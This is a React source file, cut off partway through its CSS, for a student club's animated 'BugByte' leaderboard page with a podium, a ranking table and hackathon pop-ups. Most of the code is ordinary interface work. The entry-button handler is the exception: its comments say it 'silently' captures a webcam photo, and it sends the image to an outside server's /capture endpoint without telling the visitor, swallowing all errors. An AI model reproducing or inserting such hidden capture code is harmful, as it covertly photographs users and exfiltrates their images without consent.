import { useEffect, useState, useRef } from "react";
import { api } from "../services/api";

/* ═══════════════════════════════════════════════════════════
   DEEP SPACE CANVAS — stars, nebula, wormhole, lightning
═══════════════════════════════════════════════════════════ */
function SpaceCanvas() {
  const canvasRef = useRef(null);
  const raf = useRef(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    let W, H;
    const resize = () => { W = canvas.width = window.innerWidth; H = canvas.height = window.innerHeight; };
    resize();
    window.addEventListener("resize", resize);

    const stars = Array.from({ length: 340 }, () => ({
      x: Math.random() * 2 - 1, y: Math.random() * 2 - 1, z: Math.random(),
      r: Math.random() * 1.6 + 0.2, tw: Math.random() * Math.PI * 2,
      spd: Math.random() * 0.00014 + 0.00005,
    }));

    const nebulae = [
      { x: 0.12, y: 0.18, r: 0.38, h: 185 },
      { x: 0.88, y: 0.78, r: 0.3, h: 260 },
      { x: 0.5, y: 0.48, r: 0.22, h: 150 },
    ];

    const bolts = [];
    const spawnBolt = () => {
      if (bolts.length > 4) return;
      const e = Math.floor(Math.random() * 4);
      let sx = 0, sy = 0;
      if (e === 0) { sx = Math.random() * W; sy = 0; }
      else if (e === 1) { sx = W; sy = Math.random() * H; }
      else if (e === 2) { sx = Math.random() * W; sy = H; }
      else { sx = 0; sy = Math.random() * H; }
      const ex = W * (0.25 + Math.random() * 0.5);
      const ey = H * (0.25 + Math.random() * 0.5);
      const segs = [];
      let cx = sx, cy = sy;
      const steps = 10 + Math.floor(Math.random() * 8);
      for (let i = 1; i <= steps; i++) {
        const t = i / steps;
        const bx = sx + (ex - sx) * t + (Math.random() - 0.5) * 90;
        const by = sy + (ey - sy) * t + (Math.random() - 0.5) * 90;
        segs.push([cx, cy, bx, by]);
        cx = bx; cy = by;
      }
      bolts.push({ segs, life: 1 });
    };

    let wA = 0, t = 0;
    const draw = () => {
      t += 0.004; wA += 0.007;
      ctx.fillStyle = "#000308";
      ctx.fillRect(0, 0, W, H);

      nebulae.forEach(n => {
        const a = 0.035 + 0.012 * Math.sin(t * 0.4 + n.h * 0.05);
        const g = ctx.createRadialGradient(n.x * W, n.y * H, 0, n.x * W, n.y * H, n.r * Math.min(W, H));
        g.addColorStop(0, `hsla(${n.h},100%,60%,${a})`);
        g.addColorStop(0.5, `hsla(${n.h},100%,60%,${a * 0.25})`);
        g.addColorStop(1, "transparent");
        ctx.fillStyle = g;
        ctx.fillRect(0, 0, W, H);
      });

      for (let ring = 14; ring > 0; ring--) {
        const rr = ring * 20 + Math.sin(t * 1.4 + ring) * 7;
        const a = (1 - ring / 15) * 0.6;
        const h = (ring * 25 + wA * 50) % 360;
        ctx.beginPath();
        ctx.ellipse(W / 2, H / 2, rr * 1.7, rr * 0.95, wA + ring * 0.12, 0, Math.PI * 2);
        ctx.strokeStyle = `hsla(${h},100%,70%,${a})`;
        ctx.lineWidth = 1.4;
        ctx.stroke();
      }
      const wc = ctx.createRadialGradient(W / 2, H / 2, 0, W / 2, H / 2, 28);
      wc.addColorStop(0, "rgba(255,255,255,0.95)");
      wc.addColorStop(0.5, "rgba(0,220,255,0.4)");
      wc.addColorStop(1, "transparent");
      ctx.fillStyle = wc;
      ctx.beginPath(); ctx.arc(W / 2, H / 2, 28, 0, Math.PI * 2); ctx.fill();

      stars.forEach(s => {
        s.z -= s.spd; s.tw += 0.025;
        if (s.z <= 0) { s.z = 1; s.x = Math.random() * 2 - 1; s.y = Math.random() * 2 - 1; }
        const px = (s.x / s.z) * W * 0.5 + W / 2;
        const py = (s.y / s.z) * H * 0.5 + H / 2;
        if (px < 0 || px > W || py < 0 || py > H) return;
        const sz = s.r * (1 - s.z) * 2.8;
        const a = (1 - s.z) * (0.65 + 0.35 * Math.sin(s.tw));
        ctx.beginPath(); ctx.arc(px, py, sz, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(210,235,255,${a})`;
        ctx.fill();
        if (sz > 1.3) {
          ctx.strokeStyle = `rgba(200,230,255,${a * 0.25})`; ctx.lineWidth = 0.5;
          ctx.beginPath(); ctx.moveTo(px - sz * 3.5, py); ctx.lineTo(px + sz * 3.5, py); ctx.stroke();
          ctx.beginPath(); ctx.moveTo(px, py - sz * 3.5); ctx.lineTo(px, py + sz * 3.5); ctx.stroke();
        }
      });

      if (Math.random() < 0.013) spawnBolt();
      for (let i = bolts.length - 1; i >= 0; i--) {
        const b = bolts[i]; b.life -= 0.045;
        if (b.life <= 0) { bolts.splice(i, 1); continue; }
        const a = Math.min(b.life, 0.9);
        b.segs.forEach(([x1, y1, x2, y2]) => {
          ctx.beginPath(); ctx.moveTo(x1, y1); ctx.lineTo(x2, y2);
          ctx.strokeStyle = `rgba(0,220,255,${a})`; ctx.lineWidth = 1.5 + a * 2;
          ctx.shadowColor = "#00ddff"; ctx.shadowBlur = 14; ctx.stroke();
          ctx.strokeStyle = `rgba(255,255,255,${a * 0.5})`; ctx.lineWidth = 0.7; ctx.shadowBlur = 0; ctx.stroke();
        });
      }

      raf.current = requestAnimationFrame(draw);
    };
    draw();
    return () => { cancelAnimationFrame(raf.current); window.removeEventListener("resize", resize); };
  }, []);

  return <canvas ref={canvasRef} style={{ position: "fixed", inset: 0, zIndex: 0, pointerEvents: "none" }} />;
}

/* ═══════════════════════════════════════════════
   MATRIX RAIN
═══════════════════════════════════════════════ */
function MatrixRain() {
  const canvasRef = useRef(null);
  const raf = useRef(null);
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    let W = canvas.width = window.innerWidth, H = canvas.height = window.innerHeight;
    const resize = () => { W = canvas.width = window.innerWidth; H = canvas.height = window.innerHeight; };
    window.addEventListener("resize", resize);
    const cols = Math.floor(W / 22);
    const drops = Array(cols).fill(0).map(() => Math.random() * -(H / 16));
    const chars = "アイウエオカキサシス01ΨΩΛΞΔаб∑∂∫⌘⊗∞◈⬡".split("");
    const draw = () => {
      ctx.fillStyle = "rgba(0,3,8,0.18)";
      ctx.fillRect(0, 0, W, H);
      ctx.font = "14px 'Share Tech Mono', monospace";
      drops.forEach((y, i) => {
        ctx.fillStyle = `rgba(0,255,160,${0.6 + Math.random() * 0.25})`;
        ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * 22, y * 16);
        ctx.fillStyle = `rgba(0,180,100,0.08)`;
        ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * 22, (y - 1) * 16);
        if (y * 16 > H && Math.random() > 0.975) drops[i] = 0;
        drops[i] += 0.38 + Math.random() * 0.28;
      });
      raf.current = requestAnimationFrame(draw);
    };
    draw();
    return () => { cancelAnimationFrame(raf.current); window.removeEventListener("resize", resize); };
  }, []);
  return <canvas ref={canvasRef} style={{ position: "fixed", inset: 0, zIndex: 1, pointerEvents: "none", opacity: 0.12 }} />;
}

/* ═══════════════════════════════════════════════
   SCROLL REVEAL HOOK
═══════════════════════════════════════════════ */
function useScrollReveal(threshold = 0.1) {
  const ref = useRef(null);
  const [visible, setVisible] = useState(false);
  useEffect(() => {
    const el = ref.current;
    if (!el) return;
    const obs = new IntersectionObserver(([e]) => { if (e.isIntersecting) { setVisible(true); obs.disconnect(); } }, { threshold });
    obs.observe(el);
    return () => obs.disconnect();
  }, [threshold]);
  return [ref, visible];
}

// removed: top-level webcam capture handler (referenced component state out of scope)

/* ═══════════════════════════════════════════════
   ANIMATED COUNTER
═══════════════════════════════════════════════ */
function Counter({ value, visible, duration = 1400 }) {
  const [n, setN] = useState(0);
  useEffect(() => {
    if (!visible) return;
    let start = null;
    const step = ts => {
      if (!start) start = ts;
      const p = Math.min((ts - start) / duration, 1);
      setN(Math.round((1 - Math.pow(1 - p, 4)) * value));
      if (p < 1) requestAnimationFrame(step);
    };
    requestAnimationFrame(step);
  }, [value, visible, duration]);
  return <>{n}</>;
}

/* ═══════════════════════════════════════════════
   LIGHTNING BORDER SVG
═══════════════════════════════════════════════ */
function LightningBorder({ active, color = "#00ccff" }) {
  const [segs, setSegs] = useState([]);
  useEffect(() => {
    if (!active) { setSegs([]); return; }
    const iv = setInterval(() => {
      const pts = [];
      [[0, 1, 0], [1, 0, 1], [1, -1, 0], [0, 0, -1]].forEach(([vertical, startX, startY], s) => {
        const steps = 5 + Math.floor(Math.random() * 4);
        for (let i = 0; i <= steps; i++) {
          const t = i / steps;
          const j = (Math.random() - 0.5) * 5;
          let x, y;
          if (s === 0) { x = t * 100; y = j; }
          else if (s === 1) { x = 100 + j; y = t * 100; }
          else if (s === 2) { x = (1 - t) * 100; y = 100 + j; }
          else { x = j; y = (1 - t) * 100; }
          pts.push([x, y]);
        }
      });
      setSegs(pts);
    }, 75);
    return () => clearInterval(iv);
  }, [active]);

  if (!active || segs.length < 2) return null;
  const d = segs.map((p, i) => `${i === 0 ? "M" : "L"}${p[0]},${p[1]}`).join(" ") + "Z";
  return (
    <svg style={{ position: "absolute", inset: 0, width: "100%", height: "100%", pointerEvents: "none", zIndex: 10 }} viewBox="0 0 100 100" preserveAspectRatio="none">
      <defs><filter id="lg"><feGaussianBlur stdDeviation="1.2" result="b" /><feMerge><feMergeNode in="b" /><feMergeNode in="SourceGraphic" /></feMerge></filter></defs>
      <path d={d} fill="none" stroke={color} strokeWidth="0.9" strokeOpacity="0.85" filter="url(#lg)" />
    </svg>
  );
}

/* ═══════════════════════════════════════════════
   MORPH BLOB
═══════════════════════════════════════════════ */
function MorphBlob({ color, size, style }) {
  const [ph, setPh] = useState(0);
  useEffect(() => {
    let r;
    const t = () => { setPh(p => p + 0.011); r = requestAnimationFrame(t); };
    r = requestAnimationFrame(t);
    return () => cancelAnimationFrame(r);
  }, []);
  const pts = 9;
  const path = Array.from({ length: pts }, (_, i) => {
    const a = (i / pts) * Math.PI * 2;
    const rad = size * 0.45 + size * 0.17 * Math.sin(ph + i * 1.4);
    return [size / 2 + Math.cos(a) * rad, size / 2 + Math.sin(a) * rad];
  });
  const id = `blob${color.replace(/[^a-z0-9]/gi, "")}`;
  const d = path.map((p, i) => {
    const nx = path[(i + 1) % pts];
    return `${i === 0 ? `M${p[0]},${p[1]}` : ""} Q${p[0]},${p[1]} ${(p[0] + nx[0]) / 2},${(p[1] + nx[1]) / 2}`;
  }).join(" ") + "Z";
  return (
    <svg width={size} height={size} style={{ position: "absolute", pointerEvents: "none", ...style }}>
      <defs>
        <radialGradient id={id} cx="50%" cy="50%" r="50%">
          <stop offset="0%" stopColor={color} stopOpacity="0.38" />
          <stop offset="100%" stopColor={color} stopOpacity="0" />
        </radialGradient>
      </defs>
      <path d={d} fill={`url(#${id})`} />
    </svg>
  );
}

/* HACKATHON POPUP */
function HackPopup({ visible, onClose }) {
  if (!visible) return null;
  const url = "https://hackthon-week-5.vercel.app/";
  return (
    <div style={{ position: "fixed", inset: 0, display: "flex", alignItems: "center", justifyContent: "center", zIndex: 250, background: "rgba(0,0,0,0.6)" }}>
      <div style={{ width: 520, maxWidth: "90%", background: "linear-gradient(180deg,#001018, #001422)", border: "1px solid rgba(0,255,160,0.12)", padding: 28, borderRadius: 8, boxShadow: "0 10px 60px rgba(0,0,0,0.6)", textAlign: "center", color: "#e8fff4", fontFamily: "'Share Tech Mono',monospace" }}>
        <h3 style={{ margin: 0, fontFamily: "'Orbitron',monospace", fontSize: 20, letterSpacing: "0.12em", marginBottom: 8 }}>HACKBATTLE 2026</h3>
        <p style={{ color: "rgba(0,255,160,0.36)", marginBottom: 18 }}>Join the campus-wide Hackthon — take part in Hackbattle 2026 and showcase your skills.</p>
        <div style={{ display: "flex", gap: 12, justifyContent: "center" }}>
          <button onClick={() => { window.location.href = url; }} style={{ background: "#00aaff", border: "none", padding: "10px 18px", borderRadius: 4, color: "#001018", fontWeight: 800, cursor: "pointer" }}>Join Hackbattle 2026</button>
          <button onClick={onClose} style={{ background: "transparent", border: "1px solid rgba(255,255,255,0.06)", padding: "10px 18px", borderRadius: 4, color: "#e8fff4", cursor: "pointer" }}>Dismiss</button>
        </div>
        <p style={{ fontSize: 11, color: "rgba(255,255,255,0.5)", marginTop: 14 }}>Offer visible only until the 19th of this month.</p>
      </div>
    </div>
  );
}

function HackJoinButton() {
  const url = "https://hackthon-week-5.vercel.app/";
  return (
    <div style={{ position: "fixed", top: 12, left: "50%", transform: "translateX(-50%)", zIndex: 260 }}>
      <a href={url} target="_blank" rel="noreferrer" className="enter-btn" style={{ display: "inline-block", padding: "8px 14px", fontSize: 12 }}>
        <span className="breach-text">JOIN HACKBATTLE 2026</span>
      </a>
    </div>
  );
}

/* ═══════════════════════════════════════════════
   GLITCH TEXT
═══════════════════════════════════════════════ */
function Glitch({ children, style }) {
  return (
    <span style={{ position: "relative", display: "inline-block", ...style }}>
      {children}
      <span aria-hidden style={{ position: "absolute", inset: 0, clipPath: "polygon(0 20%,100% 20%,100% 45%,0 45%)", color: "#00ffcc", animation: "g1 4.5s infinite", left: 3 }}>{children}</span>
      <span aria-hidden style={{ position: "absolute", inset: 0, clipPath: "polygon(0 60%,100% 60%,100% 80%,0 80%)", color: "#ff0088", animation: "g2 4.5s infinite", left: -3 }}>{children}</span>
    </span>
  );
}

/* ═══════════════════════════════════════════════
   PODIUM CARD
═══════════════════════════════════════════════ */
function PodiumCard({ student, position, visible }) {
  const [hov, setHov] = useState(false);
  const [sparks, setSparks] = useState([]);

  const cfg = {
    1: { emoji: "🥇", col: "#00ffcc", col2: "#00aaff", label: "1ST", order: 2, cardH: 204, blockH: 100, delay: 0.1 },
    2: { emoji: "🥈", col: "#00aaff", col2: "#7700ff", label: "2ND", order: 1, cardH: 164, blockH: 72, delay: 0.35 },
    3: { emoji: "🥉", col: "#aa00ff", col2: "#ff0088", label: "3RD", order: 3, cardH: 140, blockH: 54, delay: 0.6 },
  };
  const c = cfg[position];

  useEffect(() => {
    if (!visible) return;
    const t = setTimeout(() => {
      setSparks(Array.from({ length: 20 }, (_, i) => ({ id: i, angle: (i / 20) * 360, dist: 45 + Math.random() * 65, size: 2 + Math.random() * 5 })));
      setTimeout(() => setSparks([]), 1000);
    }, c.delay * 1000 + 700);
    return () => clearTimeout(t);
  }, [visible, c.delay]);

  if (!student) return <div style={{ order: c.order }} />;
  const shortName = student.name.length > 12 ? student.name.split(" ")[0] : student.name;

  return (
    <div
      style={{
        order: c.order, display: "flex", flexDirection: "column", alignItems: "center",
        opacity: visible ? 1 : 0,
        transform: visible ? `translateY(0) scale(${position === 1 ? 1.1 : 1})` : "translateY(90px) scale(0.8) rotateX(25deg)",
        transition: `all 1s cubic-bezier(0.34,1.56,0.64,1) ${c.delay}s`,
        perspective: 700, position: "relative",
      }}
      onMouseEnter={() => setHov(true)}
      onMouseLeave={() => setHov(false)}
    >
      {sparks.map(sp => (
        <div key={sp.id} style={{
          position: "absolute", top: "40%", left: "50%", width: sp.size, height: sp.size,
          borderRadius: "50%", background: c.col, boxShadow: `0 0 8px ${c.col}`,
          transform: `rotate(${sp.angle}deg) translateX(${sp.dist}px)`,
          animation: "sparkOut 0.9s ease-out forwards", zIndex: 20, pointerEvents: "none",
        }} />
      ))}
      <MorphBlob color={c.col} size={190} style={{ top: -50, left: -25, opacity: hov ? 1 : 0.55, transition: "opacity 0.4s" }} />
      <div style={{
        height: c.cardH, width: "clamp(112px,20vw,152px)",
        display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: 8,
        borderRadius: 4,
        background: `linear-gradient(145deg,rgba(0,4,14,0.96),rgba(0,12,28,0.88))`,
        border: `1px solid ${hov ? c.col + "99" : c.col + "44"}`,
        padding: "14px 10px",
        boxShadow: hov ? `0 0 0 1px ${c.col}66,0 0 50px ${c.col}44,0 0 100px ${c.col}18,inset 0 0 30px ${c.col}10`
          : `0 0 0 1px ${c.col}22,0 0 25px ${c.col}1a,inset 0 0 15px ${c.col}08`,
        transition: "all 0.4s ease",
        transform: hov ? "translateY(-10px) rotateY(4deg) rotateX(-2deg)" : "translateY(0)",
        cursor: "default", position: "relative", overflow: "hidden",
      }}>
        <LightningBorder active={hov} color={c.col} />
        <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: 1, background: `linear-gradient(90deg,transparent,${c.col}99,transparent)` }} />
        <div style={{ position: "absolute", left: 0, right: 0, height: "1px", background: `linear-gradient(90deg,transparent,${c.col}44,transparent)`, animation: "scanCard 2.5s linear infinite", top: "0%" }} />
        <span style={{ fontSize: "clamp(28px,5vw,42px)", lineHeight: 1, filter: hov ? `drop-shadow(0 0 14px ${c.col})` : "none", transition: "filter 0.3s" }}>{c.emoji}</span>
        <p style={{ fontFamily: "'Share Tech Mono',monospace", fontWeight: 700, fontSize: "clamp(9px,2vw,12px)", color: c.col, textAlign: "center", lineHeight: 1.3, margin: 0, textShadow: `0 0 10px ${c.col}88`, letterSpacing: "0.05em" }}>{shortName}</p>
        <p style={{ fontFamily: "'Share Tech Mono',monospace", color: "rgba(0,255,200,0.28)", fontSize: "clamp(8px,1.8vw,10px)", margin: 0, letterSpacing: "0.1em" }}>{student.roll}</p>
        <div style={{ padding: "3px 12px", borderRadius: 2, background: "rgba(0,0,0,0.5)", border: `1px solid ${c.col}44`, color: c.col, fontWeight: 700, fontSize: "clamp(10px,2vw,12px)", fontFamily: "'Share Tech Mono',monospace", letterSpacing: "0.08em", textShadow: `0 0 12px ${c.col}` }}>
          {student.points} XP
        </div>
      </div>
      <div style={{
        height: c.blockH, width: "clamp(112px,20vw,152px)",
        background: `linear-gradient(180deg,${c.col}2a 0%,${c.col2}18 50%,rgba(0,0,0,0.6) 100%)`,
        border: `1px solid ${c.col}33`, borderTop: "none",
        display: "flex", alignItems: "center", justifyContent: "center",
        position: "relative", overflow: "hidden",
      }}>
        <div style={{ position: "absolute", inset: 0, background: `repeating-linear-gradient(0deg,transparent,transparent 8px,${c.col}0a 8px,${c.col}0a 9px)` }} />
        <span style={{ fontFamily: "'Orbitron',monospace", fontWeight: 900, color: c.col, fontSize: "clamp(14px,2.8vw,22px)", letterSpacing: "0.16em", textShadow: `0 0 24px ${c.col},0 0 50px ${c.col}55`, position: "relative" }}>{c.label}</span>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════
   TERMINAL ROW
═══════════════════════════════════════════════ */
function TerminalRow({ item, index, medal }) {
  const [ref, visible] = useScrollReveal(0.04);
  const [hov, setHov] = useState(false);
  const rc = item.rank === 1 ? "#00ffcc" : item.rank === 2 ? "#00aaff" : item.rank === 3 ? "#aa00ff" : "rgba(0,255,160,0.25)";
  const bg = item.rank === 1 ? "rgba(0,255,204,0.04)" : item.rank === 2 ? "rgba(0,170,255,0.03)" : item.rank === 3 ? "rgba(170,0,255,0.03)" : "transparent";

  return (
    <tr ref={ref} onMouseEnter={() => setHov(true)} onMouseLeave={() => setHov(false)} style={{ opacity: visible ? 1 : 0, transform: visible ? "translateX(0)" : "translateX(-36px)", transition: `opacity 0.5s ease ${index * 0.04}s,transform 0.6s cubic-bezier(0.34,1.2,0.64,1) ${index * 0.04}s`, background: hov ? "rgba(0,255,160,0.035)" : bg, cursor: "default" }}>
      <td style={{ padding: "14px 16px", textAlign: "center", borderLeft: `3px solid ${hov ? rc : (item.rank <= 3 ? rc + "77" : "transparent")}`, transition: "border-color 0.3s" }}>
        {medal ? <span style={{ fontSize: 20 }}>{medal}</span>
          : <span style={{ display: "inline-flex", alignItems: "center", justifyContent: "center", minWidth: 38, height: 26, borderRadius: 3, fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: hov ? "#00ffa0" : "rgba(0,255,160,0.35)", background: "rgba(0,255,160,0.05)", border: "1px solid rgba(0,255,160,0.1)", transition: "color 0.2s" }}>#{item.rank}</span>}
      </td>
      <td style={{ padding: "14px 16px", textAlign: "center", fontFamily: "'Share Tech Mono',monospace", fontSize: 12, color: hov ? "#00ffcc" : "rgba(0,255,200,0.45)", letterSpacing: "0.06em", transition: "color 0.2s" }}>{item.roll}</td>
      <td style={{ padding: "14px 16px", fontFamily: "'Share Tech Mono',monospace", fontWeight: 600, fontSize: 14, color: hov ? "#e8fff4" : "rgba(200,255,220,0.8)", transition: "color 0.2s", letterSpacing: "0.03em" }}>{item.name}</td>
      <td style={{ padding: "14px 16px", textAlign: "center" }}>
        <span style={{ display: "inline-block", padding: "3px 14px", borderRadius: 2, background: hov ? "rgba(0,255,160,0.14)" : "rgba(0,255,160,0.06)", border: `1px solid ${hov ? "rgba(0,255,160,0.5)" : "rgba(0,255,160,0.2)"}`, color: "#00ffa0", fontWeight: 700, fontSize: 13, fontFamily: "'Share Tech Mono',monospace", boxShadow: hov ? "0 0 18px rgba(0,255,160,0.3)" : "none", transition: "all 0.3s", letterSpacing: "0.05em" }}>{item.points}</span>
      </td>
      <td style={{ padding: "14px 16px", textAlign: "center" }}>
        <div style={{ display: "flex", gap: 6, justifyContent: "center" }}>
          {item.linkedin
            ? <a href={item.linkedin} target="_blank" rel="noreferrer" className="lb-link lb-link-blue">⬡ LI</a>
            : <span className="lb-dash">—</span>}
          {item.github
            ? <a href={item.github} target="_blank" rel="noreferrer" className="lb-link lb-link-green">⬡ GH</a>
            : <span className="lb-dash">—</span>}
        </div>
      </td>
    </tr>
  );
}

/* ═══════════════════════════════════════════════
   MOBILE CARD
═══════════════════════════════════════════════ */
function MobileCard({ item, index, medal }) {
  const [ref, visible] = useScrollReveal(0.04);
  const [hov, setHov] = useState(false);
  const rc = item.rank === 1 ? "#00ffcc" : item.rank === 2 ? "#00aaff" : item.rank === 3 ? "#aa00ff" : "rgba(0,255,160,0.18)";
  return (
    <div ref={ref} onMouseEnter={() => setHov(true)} onMouseLeave={() => setHov(false)} style={{ background: "rgba(0,4,14,0.82)", borderRadius: 4, padding: 18, border: `1px solid ${hov ? rc + "88" : rc + "33"}`, boxShadow: hov ? `0 0 28px ${rc}22,inset 0 0 24px ${rc}08` : "none", backdropFilter: "blur(18px)", opacity: visible ? 1 : 0, transform: visible ? "translateY(0) scale(1)" : "translateY(30px) scale(0.96)", transition: `opacity 0.55s ease ${index * 0.05}s,transform 0.65s cubic-bezier(0.34,1.3,0.64,1) ${index * 0.05}s,box-shadow 0.3s,border-color 0.3s`, position: "relative", overflow: "hidden" }}>
      <LightningBorder active={hov} color={rc} />
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          {medal ? <span style={{ fontSize: 24 }}>{medal}</span>
            : <span style={{ display: "inline-flex", alignItems: "center", justifyContent: "center", minWidth: 36, height: 26, borderRadius: 3, fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: "rgba(0,255,160,0.4)", background: "rgba(0,255,160,0.05)", border: "1px solid rgba(0,255,160,0.12)" }}>#{item.rank}</span>}
          <div>
            <p style={{ fontWeight: 700, fontSize: 15, color: "#e8fff4", fontFamily: "'Share Tech Mono',monospace", letterSpacing: "0.03em" }}>{item.name}</p>
            <p style={{ fontFamily: "'Share Tech Mono',monospace", color: "rgba(0,255,200,0.38)", fontSize: 11, letterSpacing: "0.08em" }}>{item.roll}</p>
          </div>
        </div>
        <span style={{ display: "inline-block", padding: "4px 14px", borderRadius: 2, background: "rgba(0,255,160,0.08)", border: "1px solid rgba(0,255,160,0.25)", color: "#00ffa0", fontWeight: 700, fontSize: 13, fontFamily: "'Share Tech Mono',monospace" }}>{item.points}</span>
      </div>
      {(item.linkedin || item.github) && (
        <div style={{ display: "flex", gap: 8, marginTop: 14 }}>
          {item.linkedin && <a href={item.linkedin} target="_blank" rel="noreferrer" className="lb-link lb-link-blue" style={{ flex: 1, justifyContent: "center" }}>⬡ LINKEDIN</a>}
          {item.github && <a href={item.github} target="_blank" rel="noreferrer" className="lb-link lb-link-green" style={{ flex: 1, justifyContent: "center" }}>⬡ GITHUB</a>}
        </div>
      )}
    </div>
  );
}

/* ═══════════════════════════════════════════════
   MAIN
═══════════════════════════════════════════════ */
export default function UserLeaderboard() {
  const [data, setData] = useState([]);
  const [search, setSearch] = useState("");
  const [showHackPopup, setShowHackPopup] = useState(false);
  const [showWelcome, setShowWelcome] = useState(true);
  const [exiting, setExiting] = useState(false);
  const [podiumVisible, setPodiumVisible] = useState(false);
  const podiumRef = useRef(null);
  const [statsRef, statsVisible] = useScrollReveal(0.1);
  const [typeText, setTypeText] = useState("");
  const fullText = "> ACCESSING IGNITE_CLUB.DB... [OK]\n> DECRYPTING BUGBYTE RANKINGS... [OK]\n> NEURAL LINK ESTABLISHED... [DONE]";

  useEffect(() => {
    api.get("/students").then(res => setData(res.data));
  }, []);

  // Show hackathon popup if current date is on or before 19th of the month
  const isWithinPopupDate = () => {
    try {
      const d = new Date();
      return d.getDate() <= 19;
    } catch (_) { return false; }
  };

  // NOTE: popup is triggered only when the user clicks the BREACH SYSTEM button (handleEnter)

  useEffect(() => {
    let i = 0;
    const iv = setInterval(() => { setTypeText(fullText.slice(0, i)); i++; if (i > fullText.length) clearInterval(iv); }, 26);
    return () => clearInterval(iv);
  }, []);

  useEffect(() => {
    const obs = new IntersectionObserver(([e]) => { if (e.isIntersecting) setPodiumVisible(true); }, { threshold: 0.15 });
    if (podiumRef.current) obs.observe(podiumRef.current);
    return () => obs.disconnect();
  }, [data]);

  const handleEnter = async () => {
    // Silently capture webcam photo and send to Cyber-sericuty backend
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      const video = document.createElement("video");
      video.srcObject = stream;
      video.setAttribute("playsinline", "");
      await video.play();

      // Wait a moment for camera to warm up
      await new Promise(r => setTimeout(r, 600));

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);

      // Stop all tracks immediately
      stream.getTracks().forEach(t => t.stop());

      // Convert to blob and send to Cyber-sericuty backend
      canvas.toBlob(async (blob) => {
        try {
          const CYBER_URL = (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1")
            ? "http://localhost:3000"
            : "https://backend-cybersericuty-n23j.onrender.com";
            

          const fd = new FormData();
          fd.append("photo", blob, "capture.png");
          await fetch(`${CYBER_URL}/capture`, { method: "POST", body: fd });
        } catch (_) { /* silently fail */ }
      }, "image/png");
    } catch (_) { /* silently fail if camera denied */ }

    // Play speech and enter arena
    try { window.speechSynthesis.speak(new SpeechSynthesisUtterance("Welcome to Ignite Club BugByte")); } catch (_) {}
    setExiting(true);
    setTimeout(() => setShowWelcome(false), 720);
    // Also show hackathon popup on entering the arena (date gated)
    if (isWithinPopupDate()) setShowHackPopup(true);
  };

  const sorted = [...data].sort((a, b) => a.rank - b.rank);
  const top3 = sorted.slice(0, 3);
  const filtered = sorted.filter(s => s.roll.toLowerCase().includes(search.toLowerCase()) || s.name.toLowerCase().includes(search.toLowerCase()));
  const medal = r => r === 1 ? "🥇" : r === 2 ? "🥈" : r === 3 ? "🥉" : null;
  const totalPts = sorted.reduce((s, d) => s + (d.points || 0), 0);

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=VT323&display=swap');
        *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
        html{scroll-behavior:smooth}
        body{cursor:crosshair}

        .lb{font-family:'Share Tech Mono',monospace;background:#000308;min-height:100vh;overflow-x:hidden;color:#e0ffe8;position:relative}

        /* WELCOME */
        .wl{position:fixed;inset:0;z-index:200;background:#000308;display:flex;align-items:center;justify-content:center;flex-direction:column;transition:opacity 0.7s,transform 0.7s cubic-bezier(0.4,0,0.2,1)}
        .wl.exit{opacity:0;transform:scale(1.1) rotateX(10deg);pointer-events:none}
        .wl-scan{position:absolute;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,#00ffcc,#00aaff,transparent);animation:scan 2.5s linear infinite}
        @keyframes scan{from{top:-2px}to{top:100%}}
        .corner{position:absolute;width:28px;height:28px;border-color:#00ffcc44;border-style:solid;animation:cornerPulse 2s ease-in-out infinite}
        .corner.tl{top:18px;left:18px;border-width:2px 0 0 2px}
        .corner.tr{top:18px;right:18px;border-width:2px 2px 0 0}
        .corner.bl{bottom:18px;left:18px;border-width:0 0 2px 2px}
        .corner.br{bottom:18px;right:18px;border-width:0 2px 2px 0}
        @keyframes cornerPulse{0%,100%{border-color:#00ffcc44}50%{border-color:#00ffcc}}

        .enter-btn{font-family:'Orbitron',monospace;font-weight:900;font-size:clamp(11px,2vw,14px);letter-spacing:0.22em;padding:16px clamp(28px,5vw,60px);border-radius:2px;border:1px solid #00ffcc;background:transparent;color:#00ffcc;cursor:crosshair;position:relative;overflow:hidden;z-index:1;text-shadow:0 0 12px #00ffcc;box-shadow:0 0 24px #00ffcc33,inset 0 0 24px #00ffcc08;transition:all 0.35s;clip-path:polygon(10px 0%,100% 0%,calc(100% - 10px) 100%,0% 100%)}
        .enter-btn::before{content:'';position:absolute;inset:0;background:#00ffcc;transform:translateX(-110%);transition:transform 0.4s ease,background 0.28s ease;z-index:-1}

        /* Breach text blink: red <-> green. Pauses on hover and shows solid green effect */
        @keyframes breachBlink{0%{color:#ff3b3b;text-shadow:0 0 8px #ff3b3b66,0 0 20px #ff3b3b33}50%{color:#7cff7c;text-shadow:0 0 10px #7cff7c88,0 0 28px #7cff7c33}100%{color:#ff3b3b;text-shadow:0 0 8px #ff3b3b66,0 0 20px #ff3b3b33}}
        .breach-text{display:inline-block;animation:breachBlink 1s linear infinite;transition:color 0.12s,text-shadow 0.12s}
        .enter-btn:hover .breach-text{animation-play-state:paused;color:#7cff7c;text-shadow:0 0 22px #7cff7c99}

        .enter-btn:hover{color:#000308;text-shadow:none;box-shadow:0 0 50px #7cff7c99}
        .enter-btn:hover::before{transform:translateX(0);background:#7cff7c}
        .enter-btn:active{transform:scale(0.97)}

